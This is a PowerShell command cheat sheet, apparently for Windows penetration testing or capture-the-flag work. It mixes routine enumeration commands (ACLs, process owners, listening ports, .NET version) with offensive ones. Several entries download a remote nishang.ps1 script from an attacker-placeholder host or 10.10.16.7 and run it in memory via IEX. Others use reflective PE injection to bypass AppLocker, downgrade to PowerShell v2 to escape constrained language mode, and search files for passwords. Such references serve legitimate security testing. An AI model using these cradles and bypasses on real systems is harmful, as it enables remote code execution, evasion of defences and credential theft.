## Extract zip file
```powershell
Expand-Archive <FILE>.zip
```

## Execute powershell in memory
```powershell
(New-Object Net.WebClient).DownloadString('<URL>') | IEX
```

## Get files only in a directory
```powershell
(ls -File -Recurse -Force -EA SilentlyContinue).fullname
```

## Get OS architecture
```powershell
$env:processor_architecture
```

## Get Process Architecture
```powershell
[Environment]::Is64BitProcess
```

## Locally listening ports (TCP)
`netstat -ano -p tcp`

## Get ACL
```powershell
Get-ACL <PATH_TO_FILE> | Select -Exp AccessToString
```

## get file system access
```powershell
$ErrorActionPreference = 'silentlycontinue'; ls -recurse -force | ? {$_.fullname -notmatch 'AppData|Application Data|Local Settings'} | ? {(get-acl $_.fullname ).accesstostring -like '*tushikikatomo*'} | select -expand fullname; $ErrorActionPreference = 'continue'
```

## Get Process Owners
```powershell
Get-WmiObject -class win32_process | ? {$_.name -notlike '*svchost*'} | select name,@{n='owner';e={$_.getowner().user}} | ft -autosize
```

## Get .NET Version
### Paths:
```
c:\windows\microsoft.net\framework
c:\windows\microsoft.net\framework64
```
### Command:
```powershell
(Get-Item "c:\windows\microsoft.net\framework64\*\clr.dll").VersionInfo.ProductVersion
```

## get-bytes of a string
`[System.Text.Encoding]::UTF8.GetBytes('hello')`

## Reflective Execution (Can Bypass Applocker)
```powershell
Invoke-reflectivePEInjection -PEBytes ([IO.File]::ReadAllBytes('<PATH_TO_EXE>'))
```

## CMD to powershell
```shell
powershell "IEX(New-Object Net.webClient).downloadString('http://<LHOST>:<LPORT>/nishang.ps1')"
```

## Start a job with alternative creds
```powershell
Start-Job -Credential $Cred -ScriptBlock {IEX(New-Object Net.webClient).downloadString('http://<LHOST>:<LPORT>/nishang.ps1')}
```

## Downgrade to powershell v2 (bypass constrained language mode)
```powershell
Start-Process Powershell.exe -ArgumentList "-v 2 -c IEX(New-Object Net.webClient).downloadString('http://10.10.16.7/nishang.ps1')"
```

## Find files Alternate Data Streams
```powershell
$ErrorActionPreference = 'SilentlyContinue'; ls * -Recurse -Force | % {Get-Item $_ -Stream * | ? {$_.Stream -notmatch ':\$DATA|Zone\.Identifier'} |Select FileName, Stream};
$ErrorActionPreference = 'Continue'
```

## View listening connections (with optional PID translation to Proc names)
```powershell
$PROCS = Get-Process;
(Get-NetIPAddress -InterfaceAlias Ethernet0).IPAddress, '127.0.0.1', '0.0.0.0' | % {
	Get-NetTCPConnection -ErrorAction SilentlyContinue -LocalAddress "$_" | 
	Sort-Object LocalPort | 
	Select-Object @{n='Process';e={$ID = $_.OwningProcess; if($PROCS){($PROCS|?{$ID -eq $_.id}).name}else{$ID}}},LocalAddress,LocalPort,RemotePort, RemoteAddress, State |
    ? {$_.localport -lt 49152} |
	Format-Table
}
```

## Enable PowerShell Remoting
```powershell
Enable-PSRemoting -Force
```

## Search for strings in files (needs optimization)
`$ErrorActionPreference = 'SilentlyContinue';ls -Recurse -Force | % {sls -Path $_.fullname -Pattern ".*password.*"}; $ErrorActionPreference = 'continue'`